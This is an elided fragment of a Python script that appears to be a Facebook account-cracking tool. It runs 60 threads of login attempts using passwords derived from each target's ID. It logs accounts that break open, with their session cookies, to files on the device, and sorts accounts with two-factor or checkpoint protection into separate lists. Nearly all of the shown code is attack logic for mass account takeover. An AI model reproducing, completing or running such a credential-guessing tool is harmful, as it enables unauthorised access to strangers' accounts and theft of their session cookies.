...
def rmenu1():
	...
	with ThreadPool(max_workers=60) as tonxoys:
		...
		for rngx in xode:
			...
			if "3" in rcd:psd=[id,rngx,id[:8],id[:10],id[:6],"57273200","59039200"]
...
def graphrm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[SSB-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/ROOTJAHID-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[SSB 2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/ROOTJAHID-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[SSB-cp] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
